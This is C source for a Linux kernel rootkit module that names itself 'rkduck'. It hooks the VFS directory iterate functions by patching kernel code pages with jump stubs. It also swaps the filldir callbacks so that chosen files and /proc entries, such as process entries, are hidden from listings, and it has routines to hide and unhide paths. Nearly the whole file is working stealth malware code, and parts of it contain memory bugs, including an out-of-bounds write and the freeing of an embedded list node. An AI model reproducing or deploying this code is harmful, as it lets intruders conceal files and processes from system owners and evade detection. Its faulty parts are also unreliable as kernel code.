#include "vfs.h"

LIST_HEAD(hooked_targets);
LIST_HEAD(hidden_files);

void vfs_hijack_start(void *target) {
    struct hook *h;

    list_for_each_entry(h, &hooked_targets, list) {
        if (target == h->target) {
            preempt_count_inc();
            barrier();
            set_page_rw((ptr_t) target);

            memcpy(target, h->hijacked_code, CODE_SIZE);

            set_page_ro((ptr_t) target);
            barrier();
            preempt_count_dec();

            break;
        }
    }
}

void vfs_hijack_stop(void *target) {
    struct hook *h;

    list_for_each_entry(h, &hooked_targets, list) {
        if (target == h->target) {
            preempt_count_inc();
            barrier();
            set_page_rw((ptr_t) target);

            memcpy(target, h->original_code, CODE_SIZE);

            set_page_ro((ptr_t) target);
            barrier();
            preempt_count_dec();

            break;
        }
    }
}

void *vfs_get_iterate(const char *path) {
    void *ret;
    struct file *file;

    if ((file = filp_open(path, O_RDONLY, 0)) == NULL)
        return NULL;

    ret = file->f_op->iterate;
    filp_close(file,0);

    return ret;
}

static int vfs_hijacked_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
    char *filename;
    struct hidden_file *h_file;

    dbg("rkduck:\n\tName -> %s\n\tInode -> %llu\n\td_type -> %u\n\toffset -> %lld\n", name, ino, d_type, offset);

    dbg("rkduck: Filenames\n");
    list_for_each_entry(h_file, &hidden_files, list) {
        filename = strrchr(h_file->path, '/') + 1;
        dbg("rkduck: \t- %s\n", filename);

        if (!strncmp(name, filename, strlen(name) + 1)) {
            return 0;
        }
    }

    return vfs_original_filldir(ctx, name, namelen, offset, ino, d_type);
}

static int vfs_hijacked_proc_filldir(struct dir_context *ctx, const char *name, int namelen, loff_t offset, u64 ino, unsigned int d_type) {
    char *filename;
    struct hidden_file *h_file;

    dbg("rkduck:\n\tName -> %s\n\tInode -> %llu\n\td_type -> %u\n\toffset -> %lld\n", name, ino, d_type, offset);

    dbg("rkduck: Filenames\n");
    list_for_each_entry(h_file, &hidden_files, list) {
        filename = strrchr(h_file->path, '/') + 1;
        dbg("rkduck: \t- %s\n", filename);

        if (!strncmp(name, filename, strlen(name) + 1)) {
            return 0;
        }
    }

    return vfs_original_proc_filldir(ctx, name, namelen, offset, ino, d_type);
}

int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx) {
    int ret;
    int length;
    struct dentry de;
    struct hidden_file *h_file;
    char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
    char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);

    memset(path_name, 0, PATH_MAX);
    memset(path_name_tmp, 0, PATH_MAX);
    vfs_original_filldir = ctx->actor;
    de = *(file->f_path.dentry);

    do {
        dbg("rkduck: Parent file path -> %s\n", de.d_name.name);

        length = strlen(de.d_name.name);
        strncpy(path_name_tmp+length+1, path_name, strlen(path_name));

        if (de.d_name.name[0] != '/') {
            strncpy(path_name_tmp+1, de.d_name.name, length);
            path_name_tmp[0] = '/';
        } else {
            strncpy(path_name_tmp, de.d_name.name, length);
        }

        strncpy(path_name, path_name_tmp, strlen(path_name_tmp));
        de = *(de.d_parent);

        dbg("rkduck: Temp path -> %s\n", path_name);
    } while (strncmp(de.d_name.name, "/", 1));

    length = strlen(path_name);

    if (length < PATH_MAX && path_name[length-1] != '/') {
        path_name[length] = '/';
    } else if (length >= PATH_MAX) {
        path_name[PATH_MAX-1] = '/';
        path_name[PATH_MAX] = 0;
    }

    dbg("rkduck: Path %s\n", path_name);
    vfs_hijack_stop(vfs_original_iterate);

    dbg("rkduck: Parent directory of file to hide -> %s\n", path_name);
    list_for_each_entry(h_file, &hidden_files, list) {
        dbg("rkduck: \t- %s\n", h_file->path);
        if (!strncmp(path_name, h_file->path, strlen(path_name))) {
            *((filldir_t *)&ctx->actor) = &vfs_hijacked_filldir;
        }
    }

    ret = vfs_original_iterate(file, ctx);
    vfs_hijack_start(vfs_original_iterate);
    kfree(path_name);
    kfree(path_name_tmp);

    return ret;
}

int vfs_hijacked_proc_iterate(struct file *file, struct dir_context *ctx) {
    int ret;
    int length;
    struct dentry de;
    struct hidden_file *h_file;
    char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
    char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);

    memset(path_name, 0, PATH_MAX);
    memset(path_name_tmp, 0, PATH_MAX);
    vfs_original_proc_filldir = ctx->actor;
    de = *(file->f_path.dentry);

    do {
        dbg("rkduck: Parent file path -> %s\n", de.d_name.name);

        length = strlen(de.d_name.name);
        strncpy(path_name_tmp+length+1, path_name, strlen(path_name));

        if (de.d_name.name[0] != '/') {
            strncpy(path_name_tmp+1, de.d_name.name, length);
            path_name_tmp[0] = '/';
        } else {
            strncpy(path_name_tmp, de.d_name.name, length);
        }

        strncpy(path_name, path_name_tmp, strlen(path_name_tmp));
        de = *(de.d_parent);

        dbg("rkduck: Temp path -> %s\n", path_name);
    } while (strncmp(de.d_name.name, "/", 1));

    length = strlen(path_name);

    if (length < PATH_MAX && path_name[length-1] != '/') {
        path_name[length] = '/';
    } else if (length >= PATH_MAX) {
        path_name[PATH_MAX-1] = '/';
        path_name[PATH_MAX] = 0;
    }

    dbg("rkduck: Path %s\n", path_name);
    vfs_hijack_stop(vfs_original_proc_iterate);

    dbg("rkduck: Parent directory of file to hide -> %s\n", path_name);
    list_for_each_entry(h_file, &hidden_files, list) {
        dbg("rkduck: \t- %s\n", h_file->path);
        if (!strncmp(path_name, h_file->path, strlen(path_name))) {
            *((filldir_t *)&ctx->actor) = &vfs_hijacked_proc_filldir;
        }
    }

    ret = vfs_original_proc_iterate(file, ctx);
    vfs_hijack_start(vfs_original_proc_iterate);
    kfree(path_name);
    kfree(path_name_tmp);

    return ret;
}

// int vfs_hijacked_iterate_fct(struct file *file, struct dir_context *ctx,  
//     int (*vfs_o_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int), 
//     int (*vfs_h_filldir)(struct dir_context *, const char *, int, loff_t, u64, unsigned int), 
//     int (*vfs_o_iterate)(struct file *, struct dir_context *)) 
// {
//     int ret;
//     int length;
//     struct dentry de;
//     struct hidden_file *h_file;
//     char *path_name = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
//     char *path_name_tmp = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);

//     memset(path_name, 0, PATH_MAX);
//     memset(path_name_tmp, 0, PATH_MAX);
//     vfs_o_filldir = ctx->actor;
//     de = *(file->f_path.dentry);

//     do {
//         dbg("rkduck: Parent file path -> %s\n", de.d_name.name);

//         length = strlen(de.d_name.name);
//         strncpy(path_name_tmp+length+1, path_name, strlen(path_name));

//         if (de.d_name.name[0] != '/') {
//             strncpy(path_name_tmp+1, de.d_name.name, length);
//             path_name_tmp[0] = '/';
//         } else {
//             strncpy(path_name_tmp, de.d_name.name, length);
//         }

//         strncpy(path_name, path_name_tmp, strlen(path_name_tmp));
//         de = *(de.d_parent);

//         dbg("rkduck: Temp path -> %s\n", path_name);
//     } while (strncmp(de.d_name.name, "/", 1));

//     length = strlen(path_name);

//     if (length < PATH_MAX && path_name[length-1] != '/') {
//         path_name[length] = '/';
//     } else if (length >= PATH_MAX) {
//         path_name[PATH_MAX-1] = '/';
//         path_name[PATH_MAX] = 0;
//     }

//     dbg("rkduck: Path %s\n", path_name);
//     vfs_hijack_stop(vfs_o_iterate);

//     dbg("rkduck: Parent directory of file to hide -> %s\n", path_name);
//     list_for_each_entry(h_file, &hidden_files, list) {
//         dbg("rkduck: \t- %s\n", h_file->path);
//         if (!strncmp(path_name, h_file->path, strlen(path_name))) {
//             *((filldir_t *)&ctx->actor) = &vfs_h_filldir;
//         }
//     }

//     ret = vfs_o_iterate(file, ctx);
//     vfs_hijack_start(vfs_o_iterate);
//     kfree(path_name);
//     kfree(path_name_tmp);

//     return ret;
// }

// int vfs_hijacked_iterate(struct file *file, struct dir_context *ctx) {
//     int ret;
//     ret = vfs_hijacked_iterate_fct(file, ctx, vfs_original_filldir, vfs_hijacked_filldir, vfs_original_iterate);
//     return ret;
// }

// int vfs_hijacked_proc_iterate(struct file *file, struct dir_context *ctx) {
//     int ret;
//     ret = vfs_hijacked_iterate_fct(file, ctx, vfs_original_proc_filldir, vfs_hijacked_proc_filldir, vfs_original_proc_iterate);
//     return ret;
// }

void vfs_save_hijacked_function_code(void *target, void *new) {
    int i=0;
    struct hook *h;
    unsigned char hijacked_code[CODE_SIZE];
    unsigned char original_code[CODE_SIZE];

    dbg("rkduck: vfs_hijacked_iterate %p\n", vfs_hijacked_iterate);

    memcpy(hijacked_code, HIJACKED_CODE, CODE_SIZE);
    *(ptr_t *) &hijacked_code[POINTER_OFFSET] = (ptr_t) new;
    memcpy(original_code, target, CODE_SIZE);

    dbg("rkduck dump: hijacked code ");
    for (i=0; i<CODE_SIZE; i++)
        dbg("%02x", *((unsigned char *)hijacked_code+i) );
    dbg("\n");

    dbg("rkduck dump: original code ");
    for (i=0; i<CODE_SIZE; i++)
        dbg("%02x", *((unsigned char *)original_code+i) );
    dbg("\n");

    h = kmalloc(sizeof(struct hook), GFP_KERNEL);
    h->target = target;
    memcpy(h->hijacked_code, hijacked_code, CODE_SIZE);
    memcpy(h->original_code, original_code, CODE_SIZE);

    list_add(&h->list, &hooked_targets);
}

void vfs_hide_file(char *path) {
    struct hidden_file *h_file;
    int length;

    h_file = kmalloc(sizeof(struct hidden_file), GFP_KERNEL);
    h_file->path = kmalloc(sizeof(char)*PATH_MAX, GFP_KERNEL);
    memset(h_file->path, 0, PATH_MAX);
    length = strlen(path);

    if (length > PATH_MAX) {
        length = PATH_MAX;
    }

    strncpy(h_file->path, path, length);

    if (length > 1 && h_file->path[length-1] == '/') {
        h_file->path[length-1] = 0;
    }

    list_add(&h_file->list, &hidden_files);
    dbg("rkduck: Hide file -> %s\n", h_file->path);
}

void vfs_unhide_file(char *path) {
    struct hidden_file *h_file;
    struct list_head *next;
    struct list_head *prev;

    list_for_each_entry(h_file, &hidden_files, list) {
        if (!strncmp(path, h_file->path, strlen(h_file->path))) {
            dbg("rkduck: Unhide file -> %s\n", h_file->path);
            kfree(h_file->path);
            /* list_del(&h_file->list);
               doesn't work, don't know why
               tmp solution
            */
            next = h_file->list.next;
            prev = h_file->list.prev;
            next->prev = prev;
            prev->next = next;
            kfree(&h_file->list);
            kfree(h_file);
        }
    }
}